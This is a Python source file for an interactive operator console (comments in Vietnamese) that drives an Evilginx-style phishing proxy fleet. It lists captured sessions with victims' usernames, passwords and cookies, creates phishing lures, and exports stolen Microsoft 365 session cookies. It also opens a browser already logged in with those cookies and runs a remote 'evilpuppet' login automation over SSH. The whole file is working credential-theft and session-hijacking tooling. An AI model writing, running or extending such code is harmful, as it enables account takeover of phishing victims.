#!/usr/bin/env python3
# egconsole.py — CONSOLE ĐIỀU KHIỂN DUY NHẤT cho operator (client-side, kiểu Pro)
# Gộp: egctl (fleet API) + export cookies + session launcher (browser đăng nhập sẵn)
#       + server ops qua SSH (tail journal, puppet)
#
# Usage:
#   python egconsole.py                        # REPL tương tác
#   python egconsole.py status                 # chạy 1 lệnh rồi thoát
#
# Config:
#   - my-servers.json (array, như egctl)       : fleet mTLS API
#   - console.json (optional) {"ssh":{...}}    : host/user/key cho tail/puppet
#
# Lệnh chính (gõ help trong console):
#   status | phishlets | enable/disable <pl> | reload | hostname <pl> <host>
#   sessions [n] | session <id> | session-del <id>
#   lures | lure-create <pl> [url] | lure-url <pl> <id> [k=v...] | lure-edit <id> k=v | lure-del <id>
#   export <id> [file] | open <id> [--url U] [--fresh] [--disable-http2] [--chrome P]
#   tail [n] | puppet <url> <user> <passfile>
#   use <server-name>                          # chọn node mặc định (nếu nhiều node)

import cmd
import json
import os
import shlex
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.join(os.path.dirname(HERE), "deploy"))

SERVERS_FILE = os.path.join(HERE, "my-servers.json")
CONSOLE_CFG = os.path.join(HERE, "console.json")


def load_servers():
    if not os.path.exists(SERVERS_FILE):
        print(f"[!] thiếu {SERVERS_FILE}")
        return []
    data = json.load(open(SERVERS_FILE))
    return data if isinstance(data, list) else []


class Api:
    """mTLS API client cho 1 node (dùng chung ssl ctx như egctl)."""

    def __init__(self, srv):
        self.name = srv.get("name", srv["host"])
        # đường dẫn cert là RELATIVE tới tools/ — resolve TRƯỚC khi tạo ssl ctx
        for k in ("ca", "cert", "key"):
            if srv.get(k) and not os.path.isabs(srv[k]):
                srv[k] = os.path.normpath(os.path.join(HERE, srv[k]))
        import ssl

        # như egctl: verify bằng client-cert của private CA, hostname check tắt
        # (kết nối bằng IP — cert API không có SAN IP)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.load_cert_chain(srv["cert"], srv["key"])
        self.srv = srv
        self.ssl_ctx = ctx

    def call(self, method, path, body=None):
        import http.client

        host = self.srv["host"]
        port = self.srv.get("port", 9443)
        base = self.srv.get("base", "")
        conn = http.client.HTTPSConnection(host, port, context=self.ssl_ctx, timeout=20)
        data = json.dumps(body).encode() if body is not None else None
        headers = {"Content-Type": "application/json"} if data else {}
        conn.request(method, base + path, body=data, headers=headers)
        resp = conn.getresponse()
        raw = resp.read().decode()
        try:
            return resp.status, json.loads(raw or "{}")
        except Exception:
            return resp.status, raw

    def get_session(self, sid):
        code, out = self.call("GET", f"/sessions/{sid}")
        return out if code == 200 else {"error": f"HTTP {code}", "detail": out}


def mask(s, keep=3):
    if not s:
        return "-"
    if len(s) <= keep * 2:
        return s[0] + "*" * (len(s) - 1)
    return s[:keep] + "*" * 6 + s[-keep:]


class Console(cmd.Cmd):
    intro = (
        "egconsole — fake-evilginx-pro operator console. 'help' để xem lệnh, "
        "'use <node>' chọn node, Ctrl+D thoát."
    )
    prompt = "eg> "

    def __init__(self):
        super().__init__()
        self.servers = load_servers()
        self.api = self.servers[0] if self.servers else None
        if self.api:
            self.api = Api(self.api)
            self.prompt = f"eg[{self.api.name}]> "
        self.cfg = json.load(open(CONSOLE_CFG)) if os.path.exists(CONSOLE_CFG) else {}

    # ---------- helpers ----------
    def _require_api(self):
        if not self.api:
            print("[!] chưa có node — kiểm tra my-servers.json")
            return False
        return True

    def _ssh(self, remote_cmd, timeout=30):
        ssh = self.cfg.get("ssh") or {}
        host, user, key = ssh.get("host"), ssh.get("user", "ubuntu"), ssh.get("key")
        if not host:
            print("[!] thiếu console.json {'ssh':{'host','user','key'}}")
            return None
        cli = ["ssh", "-i", key, "-o", "BatchMode=yes", f"{user}@{host}", remote_cmd]
        r = subprocess.run(cli, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr

    # ---------- node selection ----------
    def do_use(self, arg):
        """use <server-name> — chọn node mặc định"""
        for srv in self.servers:
            if srv.get("name") == arg:
                self.api = Api(srv)
                self.prompt = f"eg[{self.api.name}]> "
                print(f"[*] node: {self.api.name} ({srv['host']}:{srv.get('port', 9443)})")
                return
        print(f"[!] không thấy node '{arg}'. Các node: " + ", ".join(s.get("name", "?") for s in self.servers))

    # ---------- fleet ----------
    def do_status(self, arg):
        code, out = self.api.call("GET", "/status")
        print(f"[{self.api.name}] {code} {out}")

    def do_phishlets(self, arg):
        code, out = self.api.call("GET", "/phishlets")
        if code == 200:
            for p in out:
                print(f"  {p['name']:12s} {'enabled' if p['enabled'] else 'disabled'}{' hidden' if p.get('hidden') else ''}")
        else:
            print(code, out)

    def do_enable(self, arg):
        code, out = self.api.call("POST", f"/phishlets/{arg}/enable")
        print(code, out)

    def do_disable(self, arg):
        code, out = self.api.call("POST", f"/phishlets/{arg}/disable")
        print(code, out)

    def do_reload(self, arg):
        code, out = self.api.call("POST", "/phishlets/reload")
        print(code, out)

    def do_proxy(self, arg):
        """proxy — xem trạng thái | proxy set <type> <host> <port> <user> <pass> <routes-cách-phẩy> | proxy on | proxy off | proxy route add|del <suffix>"""
        parts = arg.split()
        if not parts:
            code, out = self.api.call("GET", "/proxy")
            print(f"[{self.api.name}] {code} {out}")
            return
        sub = parts[0]
        if sub == "on":
            code, out = self.api.call("POST", "/proxy", {"enabled": True})
        elif sub == "off":
            code, out = self.api.call("POST", "/proxy", {"enabled": False})
        elif sub == "route" and len(parts) >= 3 and parts[1] in ("add", "del"):
            cur = self.api.call("GET", "/proxy")[1]
            routes = cur.get("routes", [])
            sfx = parts[2].lower().removeprefix("*.").strip()
            if parts[1] == "add":
                if sfx not in routes:
                    routes.append(sfx)
            else:
                routes = [r for r in routes if r != sfx]
            code, out = self.api.call("POST", "/proxy", {"routes": routes})
        elif sub == "set" and len(parts) >= 7:
            routes = [r.strip() for r in parts[6].split(",") if r.strip()]
            body = {
                "enabled": True, "type": parts[1], "address": parts[2],
                "port": int(parts[3]), "username": parts[4], "password": parts[5],
                "routes": routes,
            }
            code, out = self.api.call("POST", "/proxy", body)
        else:
            print("usage: proxy | proxy set <type> <host> <port> <user> <pass> <routes> | proxy route add|del <suffix> | proxy on | proxy off")
            return
        print(code, out)

    def do_hostname(self, arg):
        """hostname <phishlet> <hostname>"""
        parts = shlex.split(arg)
        if len(parts) != 2:
            print("usage: hostname <phishlet> <hostname>")
            return
        code, out = self.api.call("POST", f"/phishlets/{parts[0]}/hostname", {"hostname": parts[1]})
        print(code, out)

    # ---------- sessions ----------
    def do_sessions(self, arg):
        """sessions [n] — n session mới nhất (mặc định 10)"""
        code, out = self.api.call("GET", "/sessions")
        if code != 200:
            print(code, out)
            return
        n = int(arg) if arg.isdigit() else 10
        for s in sorted(out, key=lambda x: -x["id"])[:n]:
            print(
                f"  #{s['id']:<4d} {s.get('phishlet','?'):8s} "
                f"{(s.get('username') or '-'):35s} "
                f"pass:{'Y' if s.get('password') else '-'} "
                f"cookies:{len((s.get('tokens') or {}))} "
                f"{s.get('remote_addr','?')}"
            )

    def do_session(self, arg):
        """session <id> — chi tiết: creds (mask) + cookies"""
        if not arg.isdigit():
            print("usage: session <id>")
            return
        s = self.api.get_session(int(arg))
        if "error" in s:
            print(s)
            return
        print(f"  id      : #{s['id']} [{s.get('phishlet')}]")
        print(f"  username: {s.get('username') or '-'}")
        print(f"  password: {mask(s.get('password') or '')}  ({len(s.get('password') or '')} ký tự)")
        print(f"  ip/ua   : {s.get('remote_addr','?')} / {(s.get('useragent') or '')[:60]}")
        print(f"  landing : {(s.get('landing_url') or '')[:90]}")
        tokens = s.get("tokens") or {}
        print(f"  cookies : {sum(len(v) for v in tokens.values())}")
        for dom, cs in sorted(tokens.items()):
            for name, tok in sorted(cs.items()):
                print(f"      {dom:30s} {name:24s} {len(tok.get('Value',''))}B")

    def do_session_del(self, arg):
        """session-del <id>"""
        code, out = self.api.call("DELETE", f"/sessions/{arg}")
        print(code, out)

    # ---------- lures ----------
    def do_lures(self, arg):
        code, out = self.api.call("GET", "/lures")
        if code == 200:
            for l in out:
                print(f"  #{l['id']:<3d} {l.get('phishlet','?'):8s} {l.get('path','?'):12s} -> {l.get('redirect_url') or '-'}")
        else:
            print(code, out)

    def do_lure_create(self, arg):
        """lure-create <phishlet> [redirect_url]"""
        parts = shlex.split(arg)
        if not parts:
            print("usage: lure-create <phishlet> [redirect_url]")
            return
        body = {"phishlet": parts[0]}
        if len(parts) > 1:
            body["redirect_url"] = parts[1]
        code, out = self.api.call("POST", "/lures", body)
        print(code, out)

    do_lurecreate = do_lure_create

    def do_lure_url(self, arg):
        """lure-url <phishlet> <id> [k=v ...] — sinh URL (AES params: rid, email...)"""
        parts = shlex.split(arg)
        if len(parts) < 2:
            print("usage: lure-url <phishlet> <id> [k=v ...]")
            return
        qs = "&".join(p for p in parts[2:])
        path = f"/lures/{parts[1]}/url" + (f"?{qs}" if qs else "")
        code, out = self.api.call("GET", path)
        print(code, out)

    do_lureurl = do_lure_url

    def do_lure_edit(self, arg):
        """lure-edit <id> key=value [key=value ...]"""
        parts = shlex.split(arg)
        if len(parts) < 2:
            print("usage: lure-edit <id> k=v ...")
            return
        fields = {}
        for kv in parts[1:]:
            k, _, v = kv.partition("=")
            fields[k] = v
        code, out = self.api.call("PUT", f"/lures/{parts[0]}", fields)
        print(code, out)

    do_lureedit = do_lure_edit

    def do_lure_del(self, arg):
        code, out = self.api.call("DELETE", f"/lures/{arg}")
        print(code, out)

    # ---------- session reuse ----------
    def _cookies_from_session(self, sid):
        s = self.api.get_session(sid)
        if "error" in s:
            print(s)
            return None
        dicts = []
        for dom, cs in (s.get("tokens") or {}).items():
            for name, tok in cs.items():
                dicts.append(
                    {
                        "domain": dom,
                        "name": name,
                        "value": tok.get("Value", ""),
                        "path": tok.get("Path", "/") or "/",
                        "httpOnly": bool(tok.get("HttpOnly", False)),
                    }
                )
        return dicts

    def do_export(self, arg):
        """export <id> [file.json] — cookies ra Cookie-Editor JSON"""
        parts = shlex.split(arg)
        if not parts or not parts[0].isdigit():
            print("usage: export <id> [file.json]")
            return
        dicts = self._cookies_from_session(int(parts[0]))
        if dicts is None:
            return
        out_path = parts[1] if len(parts) > 1 else f"session-{parts[0]}-cookies.json"
        import session_launcher as sl

        editor = []
        now = int(time.time())
        for c in dicts:
            editor.append(
                {
                    "domain": c["domain"],
                    "expirationDate": now + 120 * 86400,
                    "hostOnly": not c["domain"].startswith("."),
                    "httpOnly": c.get("httpOnly", False),
                    "name": c["name"],
                    "path": c.get("path", "/"),
                    "sameSite": "no_restriction",
                    "secure": True,
                    "session": False,
                    "storeId": None,
                    "value": c["value"],
                }
            )
        json.dump(editor, open(out_path, "w"), indent=2)
        print(f"[*] exported {len(editor)} cookies -> {out_path}")

    def do_open(self, arg):
        """open <id> [--url U] [--fresh] [--disable-http2] [--chrome P] [--port N] [--headless]
        — mở browser ĐÃ ĐĂNG NHẬP với cookies của session"""
        parts = shlex.split(arg)
        if not parts or not parts[0].isdigit():
            print("usage: open <id> [--url U] [--fresh] [--disable-http2] [--chrome P] [--port N] [--headless]")
            return
        sid = int(parts[0])
        opts = {"url": "https://www.office.com", "fresh": False, "disable_http2": False,
                "chrome": "", "port": 9222 + (sid % 500), "headless": False,
                "profile": os.path.join(os.environ.get("TEMP", "/tmp"), f"eg-open-{sid}")}
        i = 1
        while i < len(parts):
            if parts[i] == "--url" and i + 1 < len(parts):
                opts["url"] = parts[i + 1]; i += 2
            elif parts[i] == "--chrome" and i + 1 < len(parts):
                opts["chrome"] = parts[i + 1]; i += 2
            elif parts[i] == "--port" and i + 1 < len(parts):
                opts["port"] = int(parts[i + 1]); i += 2
            elif parts[i] == "--fresh":
                opts["fresh"] = True; i += 1
            elif parts[i] == "--disable-http2":
                opts["disable_http2"] = True; i += 1
            elif parts[i] == "--headless":
                opts["headless"] = True; i += 1
            else:
                i += 1
        dicts = self._cookies_from_session(sid)
        if not dicts:
            print("[!] session không có cookies")
            return
        import session_launcher as sl

        sl.launch_with_cookies(
            dicts,
            opts["url"],
            chrome=opts["chrome"],
            profile=opts["profile"],
            port=opts["port"],
            fresh=opts["fresh"],
            headless=opts["headless"],
            disable_http2=opts["disable_http2"],
        )

    # ---------- server ops (SSH) ----------
    def do_tail(self, arg):
        """tail [n] — journalctl evilginx2 trên VPS (n dòng, mặc định 30)"""
        n = arg if arg.isdigit() else "30"
        out = self._ssh(f"sudo journalctl -u evilginx2 --no-pager -n {n} --output=cat | "
                        f"grep -vE 'whitelistIP|POST body' | tail -{n}")
        print(out or "[!] không có output")

    def do_puppet(self, arg):
        """puppet <lure-url> <user> <passfile-local> — chạy evilpuppet-lite trên VPS"""
        parts = shlex.split(arg)
        if len(parts) != 3:
            print("usage: puppet <lure-url> <user> <passfile-local>")
            return
        url, user, passfile = parts
        if not os.path.isfile(passfile):
            print(f"[!] không thấy {passfile}")
            return
        import base64

        b64 = base64.b64encode(open(passfile, "rb").read()).decode()
        remote = (
            f"echo {b64} | base64 -d > /tmp/pp.pass && chmod 600 /tmp/pp.pass && "
            f"cd ~/evilginx2-lab && timeout 560 ./evilpuppet-lite "
            f"-url '{url}' -user '{user}' -passfile /tmp/pp.pass "
            f"-phishlet ms365 -api-host 127.0.0.1:9443 -cfgdir ~/.evilginx/api "
            f"-chrome ~/.cache/ms-playwright/chromium-*/chrome-linux*/chrome "
            f"-timeout 200 -mfa-wait 300 2>&1 | tail -8; rm -f /tmp/pp.pass"
        )
        print(self._ssh(remote, timeout=600) or "[!] không có output")

    def do_quit(self, arg):
        return True

    do_exit = do_quit
    do_EOF = do_quit


if __name__ == "__main__":
    args = sys.argv[1:]
    c = Console()
    if args:
        c.onecmd(" ".join(args))
    else:
        c.cmdloop()
